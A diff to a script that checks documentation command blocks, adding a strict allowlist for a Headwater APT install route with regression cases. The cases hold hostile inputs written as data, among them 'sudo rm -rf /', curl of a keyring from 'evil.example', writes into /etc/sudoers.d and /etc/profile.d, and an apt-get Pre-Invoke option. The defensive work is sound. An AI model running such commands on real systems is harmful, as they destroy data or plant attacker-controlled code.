@@ -31,6 +31,17 @@ unchanged, with no quote, escape, brace or glob, and a tar operand names no
 host. Anything else in either piece refuses it, because curl and GNU tar
 both accept spellings a denylist does not name.
 
+**The APT route passes through an allowlist of its own (#1230).** The
+owner's ruling of 2026-09-29 amends HW-DR-0077 clause 1 to name `apt-get`,
+`sudo`, `install`, `tee` and a `curl` of the APT keyring. `check_apt` admits
+each one only in the shape the README's block runs: `apt-get update`,
+`apt-get install -y` of the packages that block names, `install -d` of the
+keyring directory, `tee` of one file under `/etc/apt/sources.list.d/`, a
+`curl -o` of `https://headwater.tools/apt/headwater-archive-keyring.asc` into
+`/etc/apt/keyrings/`, and an `echo` of a signed-by sources line for
+`https://headwater.tools/apt`. `sudo` passes only in front of one of those,
+so it is never a way to run a program the route does not name.
+
 **`cargo` is never the lead route.**
 [HW-DR-0077](../../docs/decisions/0077-the-consumer-surface-is-what-an-adopter-receives-runs-and-must-have-installed-and-it-is-a-closed-and-declared-list.md)
 makes no Rust toolchain mandatory, so the check is per document and in
@@ -52,8 +63,8 @@ fetched a location itself (#1063). A page that still pipes that script, or
 any other, into a shell now reports both pieces.
 
 **Which blocks are commands is knowledge this script borrows rather than
-re-derives.** `README.md` has no output blocks at all — both of its fenced
-blocks are commands, so every block there is checked. The tutorial states
+re-derives.** `README.md` has no output blocks at all — every one of its
+fenced blocks is a command block, so every block there is checked. The tutorial states
 its own convention in *Before you start*: "A block is a command or it is
 output, and the two look the same" — nothing marks the difference except
 which order the page tells it in, so `drive.py`'s `COMMAND_BLOCK_INDICES`,
@@ -131,6 +142,23 @@ PLAIN_WORD = re.compile(r'^~?[A-Za-z0-9._/-]+$')
 # that otherwise reads as allowed, and no real command block in either
 # document ever needs one.
 SUBSTITUTION = re.compile(r'\$\(|`|<\(|>\(')
+
+# The APT route (#1230). The owner's ruling of 2026-09-29 amends HW-DR-0077
+# clause 1 to name `apt-get`, `sudo`, `install`, `tee` and one `curl` of the
+# keyring. Each passes here only in the shape the README's block runs, as an
+# allowlist in the manner of the curl and tar arms above, so `sudo` is never a
+# way to run a program the route does not name, and no piece writes outside
+# `/etc/apt/`.
+APT_KEYRING_URL = 'https://headwater.tools/apt/headwater-archive-keyring.asc'
+APT_KEYRING_PATH = re.compile(r'^/etc/apt/keyrings/[A-Za-z0-9_-][A-Za-z0-9._-]*\.asc$')
+APT_KEYRING_DIR = '/etc/apt/keyrings'
+APT_SOURCES_PATH = re.compile(
+    r'^/etc/apt/sources\.list\.d/[A-Za-z0-9_-][A-Za-z0-9._-]*\.list$')
+APT_PACKAGES = frozenset({'headwater', 'ca-certificates', 'curl'})
+APT_SOURCES_ECHO = re.compile(
+    r'^echo "deb \[signed-by=/etc/apt/keyrings/[A-Za-z0-9_-][A-Za-z0-9._-]*\.asc\] '
+    r'https://headwater\.tools/apt [a-z0-9-]+( [a-z0-9-]+)+"$')
+SUDO_ALLOWED = frozenset({'apt-get', 'install', 'curl', 'tee'})
 
 
 def parse_fenced_blocks(text):
@@ -354,6 +382,68 @@ def check_tar(tokens):
     return True
 
 
+def check_apt(tokens, piece):
+    """Whether a piece is one of the APT route's commands, in the shape the
+    README runs it and in no other (#1230). `tokens` has no `sudo` in front.
+
+    - `apt-get update`, alone; `apt-get install` with `-y` and packages
+      from `APT_PACKAGES`. No `-o`, which sets any configuration option.
+    - `install -d -m <octal> /etc/apt/keyrings`: it makes that directory
+      and copies nothing.
+    - `tee <file>` with one operand under `/etc/apt/sources.list.d/`.
+    - `curl` with short options from `fsSL`, `-o` naming a path under
+      `/etc/apt/keyrings/`, and `APT_KEYRING_URL` as the only URL.
+    - `echo "deb [signed-by=<keyring>] https://headwater.tools/apt ..."`,
+      unquoted by nothing and redirected nowhere.
+
+    Every argument is compared with an exact value or a pattern anchored at
+    both ends, and no pattern admits a `/` after its directory, so no path
+    climbs out with `..`."""
+    if not tokens:
+        return False
+    head = tokens[0]
+    if head == 'echo':
+        return bool(APT_SOURCES_ECHO.match(piece.strip()))
+    if head == 'apt-get':
+        if tokens[1:] == ['update']:
+            return True
+        if len(tokens) < 3 or tokens[1] != 'install':
+            return False
+        packages = [t for t in tokens[2:] if t != '-y']
+        return bool(packages) and set(packages) <= APT_PACKAGES
+    if head == 'install':
+        return (len(tokens) == 5 and tokens[1] == '-d' and tokens[2] == '-m'
+                and re.match(r'^0?[0-7]{3}$', tokens[3]) is not None
+                and tokens[4] == APT_KEYRING_DIR)
+    if head == 'tee':
+        return len(tokens) == 2 and APT_SOURCES_PATH.match(tokens[1]) is not None
+    if head == 'curl':
+        rest, url, out = tokens[1:], 0, 0
+        i = 0
+        while i < len(rest):
+            t = rest[i]
+            if t == '-o' and i + 1 < len(rest) and APT_KEYRING_PATH.match(rest[i + 1]):
+                out += 1
+                i += 2
+                continue
+            if t == APT_KEYRING_URL:
+                url += 1
+            elif not (t.startswith('-') and len(t) > 1
+                      and set(t[1:]) <= frozenset('fsSL')):
+                return False
+            i += 1
+        return url == 1 and out == 1
+    return False
+
+
+def check_sudo(tokens, piece):
+    """`sudo` passes only in front of an APT-route program in its APT
+    shape, and with no option of its own."""
+    if len(tokens) < 2 or tokens[1] not in SUDO_ALLOWED:
+        return False
+    return check_apt(tokens[1:], piece.split(None, 1)[1])
+
+
 def check_piece(piece, cargo_allowed=False):
     """Whether one already-split piece is an allowed command.
 
@@ -368,10 +458,14 @@ def check_piece(piece, cargo_allowed=False):
     if tokens[0] == 'cargo':
         return (cargo_allowed and len(tokens) > 1
                 and tokens[1] in CARGO_ALLOWED_SUBCOMMANDS)
+    if tokens[0] == 'sudo':
+        return check_sudo(tokens, piece)
     if tokens[0] == 'curl':
-        return is_release_download(piece)
+        return is_release_download(piece) or check_apt(tokens, piece)
     if tokens[0] == 'tar':
         return check_tar(tokens)
+    if tokens[0] in ('apt-get', 'install', 'tee', 'echo'):
+        return check_apt(tokens, piece)
     return tokens[0] in ALLOWED_LEADING_WORDS
 
 
@@ -419,6 +513,19 @@ def undeclared_in_document(blocks, cargo_may_follow_download):
             download_seen = True
     return failures
 
+
+# The README's APT block as it stands on the day the arm landed (#1230).
+APT_BLOCK = (
+    'sudo apt-get update\n'
+    'sudo apt-get install -y ca-certificates curl\n'
+    'sudo install -d -m 0755 /etc/apt/keyrings\n'
+    'sudo curl -fsSL -o /etc/apt/keyrings/headwater-archive-keyring.asc '
+    'https://headwater.tools/apt/headwater-archive-keyring.asc\n'
+    'echo "deb [signed-by=/etc/apt/keyrings/headwater-archive-keyring.asc] '
+    'https://headwater.tools/apt stable main" | sudo tee /etc/apt/sources.list.d/headwater.list\n'
+    'sudo apt-get update\n'
+    'sudo apt-get install -y headwater\n'
+    'headwater --version')
 
 # Regression cases: every attack shape a verifier has raised against this
 # check, held here so a future edit that reopens one of them fails a run of
@@ -705,6 +812,87 @@ REGRESSION_CASES = [
     ('an operator inside backticks starts a piece',
      'echo `a && npm ci`',
      ['echo `a', 'npm ci`']),
+    # #1230, and the owner's ruling of 2026-09-29 that amends HW-DR-0077
+    # clause 1: the APT route. Each program passes only in the shape the
+    # README's block runs, with `sudo` or without it.
+    ('the APT install block is not undeclared',
+     APT_BLOCK,
+     []),
+    ('the APT install block run as root, with no sudo, is not undeclared',
+     APT_BLOCK.replace('sudo ', ''),
+     []),
+    ('curl to the keyring path from another host is undeclared',
+     'sudo curl -fsSL -o /etc/apt/keyrings/headwater-archive-keyring.asc '
+     'https://evil.example/apt/headwater-archive-keyring.asc',
+     ['sudo curl -fsSL -o /etc/apt/keyrings/headwater-archive-keyring.asc '
+      'https://evil.example/apt/headwater-archive-keyring.asc']),
+    ('curl of the keyring written outside the keyring directory is undeclared',
+     'sudo curl -fsSL -o /etc/sudoers.d/x '
+     'https://headwater.tools/apt/headwater-archive-keyring.asc',
+     ['sudo curl -fsSL -o /etc/sudoers.d/x '
+      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
+    ('curl of the keyring climbing out of the keyring directory is undeclared',
+     'curl -fsSL -o /etc/apt/keyrings/../../profile.d/x.asc '
+     'https://headwater.tools/apt/headwater-archive-keyring.asc',
+     ['curl -fsSL -o /etc/apt/keyrings/../../profile.d/x.asc '
+      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
+    ('curl of another file from the APT site is undeclared',
+     'curl -fsSL -o /etc/apt/keyrings/x.asc https://headwater.tools/apt/install.sh',
+     ['curl -fsSL -o /etc/apt/keyrings/x.asc https://headwater.tools/apt/install.sh']),
+    ('curl of the keyring with a long option is undeclared',
+     'curl -fsSL --config /tmp/c -o /etc/apt/keyrings/x.asc '
+     'https://headwater.tools/apt/headwater-archive-keyring.asc',
+     ['curl -fsSL --config /tmp/c -o /etc/apt/keyrings/x.asc '
+      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
+    ('a program the APT route does not name, under sudo, is undeclared',
+     'sudo rm -rf /',
+     ['sudo rm -rf /']),
+    ('sudo with an option of its own is undeclared',
+     'sudo -u root apt-get update',
+     ['sudo -u root apt-get update']),
+    ('apt-get installing a package the route does not name is undeclared',
+     'sudo apt-get install -y nodejs',
+     ['sudo apt-get install -y nodejs']),
+    ('apt-get with a subcommand the route does not run is undeclared',
+     'apt-get source headwater',
+     ['apt-get source headwater']),
+    ('apt-get with an option that sets configuration is undeclared',
+     'apt-get -o APT::Update::Pre-Invoke::=x update',
+     ['apt-get -o APT::Update::Pre-Invoke::=x update']),
+    ('tee writing outside the APT source list directory is undeclared',
+     'echo x | sudo tee /etc/profile.d/x.sh',
+     ['echo x', 'sudo tee /etc/profile.d/x.sh']),
+    ('tee appending with an option is undeclared',
+     'sudo tee -a /etc/apt/sources.list.d/headwater.list',
+     ['sudo tee -a /etc/apt/sources.list.d/headwater.list']),
+    ('install making a directory outside the keyring directory is undeclared',
+     'sudo install -d -m 0755 /usr/local/bin/x',
+     ['sudo install -d -m 0755 /usr/local/bin/x']),
+    ('install copying a file, not making a directory, is undeclared',
+     'sudo install evil -m 0755 /etc/apt/keyrings',
+     ['sudo install evil -m 0755 /etc/apt/keyrings']),
+    ('curl of the keyring with TLS checks turned off is undeclared',
+     'curl -fsSLk -o /etc/apt/keyrings/x.asc '
+     'https://headwater.tools/apt/headwater-archive-keyring.asc',
+     ['curl -fsSLk -o /etc/apt/keyrings/x.asc '
+      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
+    ('curl of the keyring with a quoted URL is undeclared',
+     'curl -fsSL -o /etc/apt/keyrings/x.asc '
+     '"https://headwater.tools/apt/headwater-archive-keyring.asc"',
+     ['curl -fsSL -o /etc/apt/keyrings/x.asc '
+      '"https://headwater.tools/apt/headwater-archive-keyring.asc"']),
+    ('sudo in front of the sources echo is undeclared',
+     'sudo echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main"',
+     ['sudo echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main"']),
+    ('echo of a sources line for another host is undeclared',
+     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://evil.example/apt stable main"',
+     ['echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://evil.example/apt stable main"']),
+    ('echo of a sources line with no signed-by is undeclared',
+     'echo "deb [trusted=yes] https://headwater.tools/apt stable main"',
+     ['echo "deb [trusted=yes] https://headwater.tools/apt stable main"']),
+    ('echo of a sources line redirected into a file is undeclared',
+     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" > /etc/apt/sources.list',
+     ['echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" > /etc/apt/sources.list']),
 ]
 
 
